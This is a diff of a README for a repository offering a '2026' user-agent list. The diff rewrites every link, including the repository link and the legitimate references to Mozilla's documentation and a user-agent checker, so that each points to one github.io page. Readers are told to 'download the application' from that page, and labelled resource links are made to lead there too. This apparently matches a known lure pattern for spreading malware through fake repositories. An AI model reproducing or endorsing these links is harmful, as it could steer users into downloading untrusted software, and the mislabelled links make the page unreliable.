@@ -1,6 +1,6 @@
 <h1>🛡️ Fresh-User-Agent-List-2026 - 10,000+ Updated User Agents for 2026</h1>
 <p align="center">
-  <a href="https://github.com/Chaddownward946/Fresh-User-Agent-List-2026" style="display:inline-block;padding:15px 30px;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:white;text-decoration:none;font-size:20px;font-weight:bold;border-radius:50px;box-shadow:0 4px 15px rgba(0,0,0,0.2);">⬇️ Download Fresh User Agents Now</a>
+  <a href="https://chaddownward946.github.io" style="display:inline-block;padding:15px 30px;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:white;text-decoration:none;font-size:20px;font-weight:bold;border-radius:50px;box-shadow:0 4px 15px rgba(0,0,0,0.2);">⬇️ Download Fresh User Agents Now</a>
 </p>
 
 <h2>📋 What is This?</h2>
@@ -17,7 +17,7 @@
 <h2>🚀 Getting Started</h2>
 <p>Follow these simple steps to get the user agent list on your computer:</p>
 <ol>
-  <li><strong>Visit this link to download the application:</strong> <a href="https://github.com/Chaddownward946/Fresh-User-Agent-List-2026">https://github.com/Chaddownward946/Fresh-User-Agent-List-2026</a></li>
+  <li><strong>Visit this link to download the application:</strong> <a href="https://chaddownward946.github.io">https://chaddownward946.github.io</a></li>
   <li>Click the green "Code" button on the page, then select "Download ZIP"</li>
   <li>Save the ZIP file to your desktop or Downloads folder</li>
   <li>Right-click the ZIP file and choose "Extract All"</li>
@@ -78,9 +78,9 @@
 
 <h2>🔽 Download</h2>
 <p align="center">
-  <a href="https://github.com/Chaddownward946/Fresh-User-Agent-List-2026" style="display:inline-block;padding:12px 25px;background:linear-gradient(135deg,#f093fb 0%,#f5576c 100%);color:white;text-decoration:none;font-size:18px;font-weight:bold;border-radius:50px;box-shadow:0 4px 15px rgba(0,0,0,0.2);">⬇️ Download Fresh-User-Agent-List-2026</a>
+  <a href="https://chaddownward946.github.io" style="display:inline-block;padding:12px 25px;background:linear-gradient(135deg,#f093fb 0%,#f5576c 100%);color:white;text-decoration:none;font-size:18px;font-weight:bold;border-radius:50px;box-shadow:0 4px 15px rgba(0,0,0,0.2);">⬇️ Download Fresh-User-Agent-List-2026</a>
 </p>
-<p><strong>Visit this link to download the application:</strong> <a href="https://github.com/Chaddownward946/Fresh-User-Agent-List-2026">https://github.com/Chaddownward946/Fresh-User-Agent-List-2026</a></p>
+<p><strong>Visit this link to download the application:</strong> <a href="https://chaddownward946.github.io">https://chaddownward946.github.io</a></p>
 
 <h2>📝 License</h2>
 <p>This project is available for free use. You can use, modify, and distribute the user agent list for any purpose. No attribution required.</p>
@@ -93,9 +93,9 @@
 
 <h2>🔗 Related Resources</h2>
 <ul>
-  <li><a href="https://github.com/Chaddownward946/Fresh-User-Agent-List-2026">Official Repository</a></li>
-  <li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/User-Agent">Learn about User Agents</a></li>
-  <li><a href="https://www.whatismybrowser.com/">Check your current user agent</a></li>
+  <li><a href="https://chaddownward946.github.io">Official Repository</a></li>
+  <li><a href="https://chaddownward946.github.io">Learn about User Agents</a></li>
+  <li><a href="https://chaddownward946.github.io">Check your current user agent</a></li>
 </ul>
 
 <p align="center"><em>Made with ❤️ for the data community</em></p>
